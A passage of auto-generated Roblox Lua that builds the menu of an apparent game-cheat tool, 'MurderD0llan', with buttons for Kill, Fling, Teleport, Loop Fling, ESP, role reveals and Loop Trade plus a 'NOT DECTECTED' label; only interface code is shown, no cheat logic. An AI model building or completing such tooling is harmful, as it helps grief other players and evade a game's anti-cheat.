-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TextBoxButton1PlayerName.UIGradient
G2L["a8"] = Instance.new("UIGradient", G2L["a7"]);
G2L["a8"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TextBoxButton1PlayerName.TextBox
G2L["a9"] = Instance.new("TextBox", G2L["a7"]);
G2L["a9"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["a9"]["TextSize"] = 14;
G2L["a9"]["TextWrapped"] = true;
G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a9"]["PlaceholderText"] = [[enter...]];
G2L["a9"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a9"]["Text"] = [[]];
G2L["a9"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.playername
G2L["aa"] = Instance.new("TextLabel", G2L["a5"]);
G2L["aa"]["TextWrapped"] = true;
G2L["aa"]["BorderSizePixel"] = 0;
G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["aa"]["TextSize"] = 16;
G2L["aa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["aa"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["aa"]["Text"] = [[- Player Name: @None -]];
G2L["aa"]["Name"] = [[playername]];
G2L["aa"]["BackgroundTransparency"] = 1;
G2L["aa"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.dectections
G2L["ab"] = Instance.new("TextLabel", G2L["a5"]);
G2L["ab"]["TextWrapped"] = true;
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ab"]["TextSize"] = 16;
G2L["ab"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ab"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ab"]["Text"] = [[- NOT DECTECTED -]];
G2L["ab"]["Name"] = [[dectections]];
G2L["ab"]["BackgroundTransparency"] = 1;
G2L["ab"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.HandlerV2
G2L["ac"] = Instance.new("LocalScript", G2L["a5"]);
G2L["ac"]["Name"] = [[HandlerV2]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.dectections
G2L["ad"] = Instance.new("TextLabel", G2L["a5"]);
G2L["ad"]["TextWrapped"] = true;
G2L["ad"]["BorderSizePixel"] = 0;
G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ad"]["TextSize"] = 16;
G2L["ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ad"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ad"]["Text"] = [[-----------------------------------------------------------]];
G2L["ad"]["Name"] = [[dectections]];
G2L["ad"]["BackgroundTransparency"] = 1;
G2L["ad"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton
G2L["ae"] = Instance.new("TextButton", G2L["a5"]);
G2L["ae"]["TextWrapped"] = true;
G2L["ae"]["TextStrokeTransparency"] = 0;
G2L["ae"]["BorderSizePixel"] = 0;
G2L["ae"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ae"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ae"]["TextSize"] = 20;
G2L["ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["ae"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["ae"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["ae"]["Name"] = [[TemplateButton]];
G2L["ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ae"]["Text"] = [[Kill  ]];
G2L["ae"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton.UIGradient
G2L["af"] = Instance.new("UIGradient", G2L["ae"]);
G2L["af"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton
G2L["b0"] = Instance.new("TextButton", G2L["a5"]);
G2L["b0"]["TextWrapped"] = true;
G2L["b0"]["TextStrokeTransparency"] = 0;
G2L["b0"]["BorderSizePixel"] = 0;
G2L["b0"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b0"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["b0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b0"]["TextSize"] = 20;
G2L["b0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b0"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["b0"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["b0"]["Name"] = [[TemplateButton]];
G2L["b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b0"]["Text"] = [[Fling  ]];
G2L["b0"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton.UIGradient
G2L["b1"] = Instance.new("UIGradient", G2L["b0"]);
G2L["b1"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton
G2L["b2"] = Instance.new("TextButton", G2L["a5"]);
G2L["b2"]["TextWrapped"] = true;
G2L["b2"]["TextStrokeTransparency"] = 0;
G2L["b2"]["BorderSizePixel"] = 0;
G2L["b2"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b2"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b2"]["TextSize"] = 20;
G2L["b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b2"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["b2"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["b2"]["Name"] = [[TemplateButton]];
G2L["b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b2"]["Text"] = [[Teleport  ]];
G2L["b2"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.28947383165359497, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton.UIGradient
G2L["b3"] = Instance.new("UIGradient", G2L["b2"]);
G2L["b3"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.FastSeparator
G2L["b4"] = Instance.new("TextLabel", G2L["a5"]);
G2L["b4"]["TextWrapped"] = true;
G2L["b4"]["BorderSizePixel"] = 0;
G2L["b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b4"]["TextSize"] = 16;
G2L["b4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b4"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b4"]["Text"] = [[- - -  ]];
G2L["b4"]["Name"] = [[FastSeparator]];
G2L["b4"]["BackgroundTransparency"] = 1;
G2L["b4"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.tellsherrifandmurder
G2L["b5"] = Instance.new("TextButton", G2L["a5"]);
G2L["b5"]["TextWrapped"] = true;
G2L["b5"]["TextStrokeTransparency"] = 0;
G2L["b5"]["BorderSizePixel"] = 0;
G2L["b5"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b5"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b5"]["TextSize"] = 20;
G2L["b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b5"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["b5"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["b5"]["Name"] = [[tellsherrifandmurder]];
G2L["b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b5"]["Text"] = [[Tell Sherrif And Murder  ]];
G2L["b5"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.tellsherrifandmurder.Frame
G2L["b6"] = Instance.new("Frame", G2L["b5"]);
G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["b6"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b6"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.tellsherrifandmurder.UIGradient
G2L["b7"] = Instance.new("UIGradient", G2L["b5"]);
G2L["b7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.telltrapsandgundropped
G2L["b8"] = Instance.new("TextButton", G2L["a5"]);
G2L["b8"]["TextWrapped"] = true;
G2L["b8"]["TextStrokeTransparency"] = 0;
G2L["b8"]["BorderSizePixel"] = 0;
G2L["b8"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b8"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b8"]["TextSize"] = 20;
G2L["b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b8"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["b8"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["b8"]["Name"] = [[telltrapsandgundropped]];
G2L["b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b8"]["Text"] = [[Tell Traps And Gun Dropped  ]];
G2L["b8"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.telltrapsandgundropped.Frame
G2L["b9"] = Instance.new("Frame", G2L["b8"]);
G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["b9"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b9"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.telltrapsandgundropped.UIGradient
G2L["ba"] = Instance.new("UIGradient", G2L["b8"]);
G2L["ba"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.helpwhenmurdersherrif
G2L["bb"] = Instance.new("TextButton", G2L["a5"]);
G2L["bb"]["TextWrapped"] = true;
G2L["bb"]["TextStrokeTransparency"] = 0;
G2L["bb"]["BorderSizePixel"] = 0;
G2L["bb"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bb"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bb"]["TextSize"] = 20;
G2L["bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["bb"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["bb"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["bb"]["Name"] = [[helpwhenmurdersherrif]];
G2L["bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bb"]["Text"] = [[Help When Murder / Sherrif  ]];
G2L["bb"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.helpwhenmurdersherrif.Frame
G2L["bc"] = Instance.new("Frame", G2L["bb"]);
G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["bc"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bc"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.helpwhenmurdersherrif.UIGradient
G2L["bd"] = Instance.new("UIGradient", G2L["bb"]);
G2L["bd"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.FastSeparator
G2L["be"] = Instance.new("TextLabel", G2L["a5"]);
G2L["be"]["TextWrapped"] = true;
G2L["be"]["BorderSizePixel"] = 0;
G2L["be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["be"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["be"]["TextSize"] = 16;
G2L["be"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["be"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["be"]["Text"] = [[- - -  ]];
G2L["be"]["Name"] = [[FastSeparator]];
G2L["be"]["BackgroundTransparency"] = 1;
G2L["be"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.notifywhenkilled
G2L["bf"] = Instance.new("TextButton", G2L["a5"]);
G2L["bf"]["TextWrapped"] = true;
G2L["bf"]["TextStrokeTransparency"] = 0;
G2L["bf"]["BorderSizePixel"] = 0;
G2L["bf"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bf"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bf"]["TextSize"] = 20;
G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["bf"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["bf"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["bf"]["Name"] = [[notifywhenkilled]];
G2L["bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["Text"] = [[Notify When Killed  ]];
G2L["bf"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.notifywhenkilled.Frame
G2L["c0"] = Instance.new("Frame", G2L["bf"]);
G2L["c0"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["c0"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c0"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.notifywhenkilled.UIGradient
G2L["c1"] = Instance.new("UIGradient", G2L["bf"]);
G2L["c1"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.view
G2L["c2"] = Instance.new("TextButton", G2L["a5"]);
G2L["c2"]["TextWrapped"] = true;
G2L["c2"]["TextStrokeTransparency"] = 0;
G2L["c2"]["BorderSizePixel"] = 0;
G2L["c2"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c2"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["c2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c2"]["TextSize"] = 20;
G2L["c2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c2"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["c2"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["c2"]["Name"] = [[view]];
G2L["c2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c2"]["Text"] = [[View  ]];
G2L["c2"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.view.Frame
G2L["c3"] = Instance.new("Frame", G2L["c2"]);
G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["c3"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c3"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.view.UIGradient
G2L["c4"] = Instance.new("UIGradient", G2L["c2"]);
G2L["c4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.notifywhennewrole
G2L["c5"] = Instance.new("TextButton", G2L["a5"]);
G2L["c5"]["TextWrapped"] = true;
G2L["c5"]["TextStrokeTransparency"] = 0;
G2L["c5"]["BorderSizePixel"] = 0;
G2L["c5"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c5"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["c5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c5"]["TextSize"] = 20;
G2L["c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c5"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["c5"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["c5"]["Name"] = [[notifywhennewrole]];
G2L["c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c5"]["Text"] = [[Notify When New Role  ]];
G2L["c5"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.notifywhennewrole.Frame
G2L["c6"] = Instance.new("Frame", G2L["c5"]);
G2L["c6"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["c6"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["c6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c6"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.notifywhennewrole.UIGradient
G2L["c7"] = Instance.new("UIGradient", G2L["c5"]);
G2L["c7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.FastSeparator
G2L["c8"] = Instance.new("TextLabel", G2L["a5"]);
G2L["c8"]["TextWrapped"] = true;
G2L["c8"]["BorderSizePixel"] = 0;
G2L["c8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c8"]["TextSize"] = 16;
G2L["c8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c8"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["c8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c8"]["Text"] = [[- - -  ]];
G2L["c8"]["Name"] = [[FastSeparator]];
G2L["c8"]["BackgroundTransparency"] = 1;
G2L["c8"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.loopflingantiplay
G2L["c9"] = Instance.new("TextButton", G2L["a5"]);
G2L["c9"]["TextWrapped"] = true;
G2L["c9"]["TextStrokeTransparency"] = 0;
G2L["c9"]["BorderSizePixel"] = 0;
G2L["c9"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c9"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c9"]["TextSize"] = 20;
G2L["c9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c9"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["c9"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["c9"]["Name"] = [[loopflingantiplay]];
G2L["c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c9"]["Text"] = [[Loop Fling / Anti-Play  ]];
G2L["c9"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.loopflingantiplay.Frame
G2L["ca"] = Instance.new("Frame", G2L["c9"]);
G2L["ca"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["ca"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["ca"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ca"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.loopflingantiplay.UIGradient
G2L["cb"] = Instance.new("UIGradient", G2L["c9"]);
G2L["cb"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.antimurder
G2L["cc"] = Instance.new("TextButton", G2L["a5"]);
G2L["cc"]["TextWrapped"] = true;
G2L["cc"]["TextStrokeTransparency"] = 0;
G2L["cc"]["BorderSizePixel"] = 0;
G2L["cc"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cc"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cc"]["TextSize"] = 20;
G2L["cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["cc"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["cc"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["cc"]["Name"] = [[antimurder]];
G2L["cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cc"]["Text"] = [[Anti-Murder  ]];
G2L["cc"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.antimurder.Frame
G2L["cd"] = Instance.new("Frame", G2L["cc"]);
G2L["cd"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["cd"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cd"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.antimurder.UIGradient
G2L["ce"] = Instance.new("UIGradient", G2L["cc"]);
G2L["ce"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.specialesp
G2L["cf"] = Instance.new("TextButton", G2L["a5"]);
G2L["cf"]["TextWrapped"] = true;
G2L["cf"]["TextStrokeTransparency"] = 0;
G2L["cf"]["BorderSizePixel"] = 0;
G2L["cf"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["TextSize"] = 20;
G2L["cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["cf"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["cf"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["cf"]["Name"] = [[specialesp]];
G2L["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Text"] = [[Special-ESP  ]];
G2L["cf"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.specialesp.Frame
G2L["d0"] = Instance.new("Frame", G2L["cf"]);
G2L["d0"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["d0"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d0"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.specialesp.UIGradient
G2L["d1"] = Instance.new("UIGradient", G2L["cf"]);
G2L["d1"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.looptrade
G2L["d2"] = Instance.new("TextButton", G2L["a5"]);
G2L["d2"]["TextWrapped"] = true;
G2L["d2"]["TextStrokeTransparency"] = 0;
G2L["d2"]["BorderSizePixel"] = 0;
G2L["d2"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d2"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d2"]["TextSize"] = 20;
G2L["d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d2"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["d2"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["d2"]["Name"] = [[looptrade]];
G2L["d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d2"]["Text"] = [[Loop Trade  ]];
G2L["d2"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.looptrade.Frame
G2L["d3"] = Instance.new("Frame", G2L["d2"]);
